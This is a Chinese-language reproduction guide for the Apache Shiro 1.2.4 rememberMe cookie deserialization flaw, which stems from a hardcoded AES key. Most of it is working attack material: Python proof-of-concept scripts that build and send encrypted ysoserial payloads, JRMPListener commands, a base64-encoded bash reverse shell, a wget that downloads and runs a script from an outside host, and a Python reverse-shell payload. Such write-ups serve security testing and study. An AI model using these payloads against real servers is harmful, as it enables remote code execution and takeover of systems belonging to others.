# Apache Shiro <=1.2.4 反序列化漏洞

### 一、漏洞简介

shiro默认使用了CookieRememberMeManager, 其处理cookie的流程是: 得到rememberMe的cookie值-->Base64解码-->AES解密-->反序列化.然而AES的密钥是硬编码的, 就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。

### 二、漏洞影响

Apache Shiro <=1.2.4

### 三、复现过程

需要一个vps ip提供rmi注册表服务，此时需要监听vps的1099端口，复现中以本机当作vps使用

poc：


```python
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
def encode_rememberme(command):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


if __name__ == '__main__':
    payload = encode_rememberme(sys.argv[1])    
print "rememberMe={0}".format(payload.decode())
```

此时在vps上执行：


```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 'curl 192.168.127.129:2345' //command可以任意指定
```

此时执行poc可以生成rememberMe的cookie：

![](images/15889403688475.png)


此时burp发送payload即可，此时因为poc是curl，因此监听vps的2345端口：

![](images/15889403785836.png)


此时发送payload即可触发反序列化达到rce的效果

![](images/15889403867290.png)


如果要反弹shell，此时vps上执行：


```bash
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyNy4xMjkvMjM0NSAwPiYxIA==}|{base64,-d}|{bash,-i}'
```

其中反弹shell执行的命令通过base64编码一次

此时vps监听2345端口，并且生成新的payload进行rememberMe的cookie替换

![](images/15889404107857.png)


![](images/15889404147079.png)


![](images/15889404189524.png)


**写webshell/反弹shell 补充**

默认shiro的commons-collections版本为3.2.1，并且在ysoserial里并没有3.2.1的版本，我们利用3.2.1的payload，结果报如下错误：


```
java.lang.ClassNotFoundException: Unable to load ObjectStreamClass [[Lorg.apache.commons.collections.Transformer;: static final long serialVersionUID = -4803604734341277543L;]: 
```

报错的原因是因为：

Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。

当然为了证明反序列化漏洞确实存在，我们可以利用ysoserial的URLDNS gadget进行验证，参数改成dns地址，测试能收到DNS请求。不过Java默认有TTL缓存，DNS解析会进行缓存，所以可能会出现第一次收到DNS的log，后面可能收不到的情况。URLDNS gadget不需要其他类的支持，它的Gadget Chain：


```
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
```

但是可以利用ysoserial的JRMP。具体利用过程如下：

在有外网的服务器下监控一个JRMP端口，wget为要执行的命令。


```bash
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 'curl www.baidu.com'
```

此时执行poc，已经执行了`curl www.baidu.com`命令。


```python
#coding: utf-8

import os
import re
import base64
import uuid
import subprocess
import requests
from Crypto.Cipher import AES

JAR_FILE = '/Users/hackedcomcn/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar'


def poc(url, rce_command):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    try:
        payload = generator(rce_command, JAR_FILE)  # 生成payload
        print payload
        print payload.decode()
        r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10)  # 发送验证请求
        print r.text
    except Exception, e:
        print(e)
        pass
    return False


def generator(command, fp):
    if not os.path.exists(fp):
        raise Exception('jar file not found!')
    popen = subprocess.Popen(['java', '-jar', fp, 'JRMPClient', command],
                             stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


poc('http://127.0.0.1:8080', '服务器ip:12345')
```

不过如果想达到命令执行的目标，可以分别执行两条命令：


```bash
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 'wget www.0-sec.org/shell.py -O /tmp/shell.py'

java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 'python /tmp/shell.py'
```

shell.py为反弹shell的代码：


```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("服务器ip",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

参考链接

https://xz.aliyun.com/t/6493#toc-2